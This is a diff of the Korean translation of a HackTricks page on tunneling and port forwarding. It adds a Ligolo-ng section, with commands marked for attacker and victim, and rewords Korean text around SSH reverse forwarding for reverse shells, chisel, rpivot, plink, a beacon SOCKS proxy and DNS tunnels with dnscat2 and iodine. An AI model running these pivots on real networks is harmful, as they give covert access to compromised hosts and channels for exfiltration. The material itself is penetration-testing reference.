@@ -1,21 +1,21 @@
 # Tunneling and Port Forwarding
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWS 해킹 배우기 및 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>HackTricks 지원하기</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
+* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
+* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**
 
 </details>
 {% endhint %}
 
-## Nmap tip
+## Nmap 팁
 
 {% hint style="warning" %}
 **ICMP** 및 **SYN** 스캔은 소켓 프록시를 통해 터널링할 수 없으므로 **핑 탐색을 비활성화**(`-Pn`)하고 **TCP 스캔**(`-sT`)을 지정해야 합니다.
@@ -71,10 +71,10 @@ ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port
 ```
 ### Reverse Port Forwarding
 
-내부 호스트에서 DMZ를 통해 귀하의 호스트로 리버스 셸을 얻는 데 유용합니다:
+이것은 DMZ를 통해 내부 호스트에서 귀하의 호스트로 리버스 셸을 얻는 데 유용합니다:
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
-# Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
+# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
 # Note that port 443 must be open
 # Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
 # and change the line "GatewayPorts no" to "GatewayPorts yes"
@@ -82,7 +82,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPN-Tunnel
 
-두 장치 모두에서 **루트 권한이 필요**합니다(새 인터페이스를 생성할 것이기 때문입니다) 그리고 sshd 설정에서 루트 로그인을 허용해야 합니다:\
+두 장치 모두에서 **루트 권한이 필요**합니다(새 인터페이스를 생성할 것이기 때문입니다) 그리고 sshd 설정은 루트 로그인을 허용해야 합니다:\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -148,7 +148,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS 프록시
 
-모든 인터페이스에서 수신 대기하는 팀 서버에서 포트를 열어 **비콘을 통해 트래픽을 라우팅**하는 데 사용할 수 있습니다.
+모든 인터페이스에서 수신 대기하는 팀 서버에 포트를 열어 **비콘을 통해 트래픽을 라우팅**하는 데 사용할 수 있습니다.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -207,12 +207,48 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
 ./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
 ```
+## Ligolo-ng
+
+[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)
+
+**에이전트와 프록시에 동일한 버전을 사용하세요**
+
+### 터널링
+```bash
+# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
+sudo ./proxy -selfcert
+# Create an interface named "ligolo" -- Attacker
+interface_create --name "ligolo"
+# Print the currently used certificate fingerprint -- Attacker
+certificate_fingerprint
+# Start the agent with certification validation -- Victim
+./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
+# Select the agent -- Attacker
+session
+1
+# Start the tunnel on the proxy server -- Attacker
+tunnel_start --tun "ligolo"
+# Display the agent's network configuration -- Attacker
+ifconfig
+# Create a route to the agent's specified network -- Attacker
+interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
+# Display the tun interfaces -- Attacker
+interface_list
+```
+### 에이전트 바인딩 및 리스닝
+```bash
+# Establish a tunnel from the proxy server to the agent
+# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
+listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
+# Display the currently running listeners on the agent -- Attacker
+listener_list
+```
 ## Rpivot
 
 [https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)
 
-역방향 터널. 터널은 피해자에서 시작됩니다.\
-127.0.0.1:1080에서 socks4 프록시가 생성됩니다.
+리버스 터널. 터널은 피해자에서 시작됩니다.\
+127.0.0.1:1080에 socks4 프록시가 생성됩니다.
 ```bash
 attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
 ```
@@ -266,7 +302,7 @@ OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacke
 ```
 [https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
 
-### SSL Socat Tunnel
+### SSL Socat 터널
 
 **/bin/sh 콘솔**
 
@@ -296,7 +332,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 콘솔 PuTTY 버전과 비슷합니다 (옵션은 ssh 클라이언트와 매우 유사합니다).
 
-이 바이너리는 피해자에서 실행될 것이며 ssh 클라이언트이므로, 역 연결을 위해 ssh 서비스와 포트를 열어야 합니다. 그런 다음, 로컬에서 접근 가능한 포트만 우리 머신의 포트로 포워딩하려면:
+이 바이너리는 피해자에서 실행될 것이며 ssh 클라이언트이므로, 역 연결을 위해 ssh 서비스와 포트를 열어야 합니다. 그런 다음, 로컬에서만 접근 가능한 포트를 우리 머신의 포트로 포워딩하려면:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -367,7 +403,7 @@ Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
 이제, 예를 들어 피해자의 **SSH** 서비스가 포트 443에서 수신 대기하도록 설정하면, 공격자는 포트 2222를 통해 연결할 수 있습니다.\
-또한 **meterpreter**를 사용하여 localhost:443에 연결하고 공격자가 포트 2222에서 수신 대기할 수 있습니다.
+또한 **meterpreter**를 사용하여 localhost:443에 연결하고 공격자가 포트 2222에서 수신 대기할 수도 있습니다.
 
 ## YARP
 
@@ -379,7 +415,7 @@ Microsoft에서 만든 리버스 프록시입니다. 여기에서 찾을 수 있
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-두 시스템 모두에서 루트 권한이 필요하여 tun 어댑터를 생성하고 DNS 쿼리를 사용하여 데이터 터널링을 수행합니다.
+두 시스템 모두에서 루트 권한이 필요하며, DNS 쿼리를 사용하여 tun 어댑터를 생성하고 데이터 터널링을 수행합니다.
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
@@ -404,7 +440,7 @@ victim> ./dnscat2 --dns host=10.10.10.10,port=5353
 ```
 #### **PowerShell에서**
 
-[**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell)를 사용하여 PowerShell에서 dnscat2 클라이언트를 실행할 수 있습니다:
+PowerShell에서 dnscat2 클라이언트를 실행하려면 [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell)를 사용할 수 있습니다:
 ```
 Import-Module .\dnscat2.ps1
 Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
@@ -529,7 +565,7 @@ GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt=
 
 * [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
 * **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
-* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**
+* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 트릭을 공유하세요.**
 
 </details>
 {% endhint %}
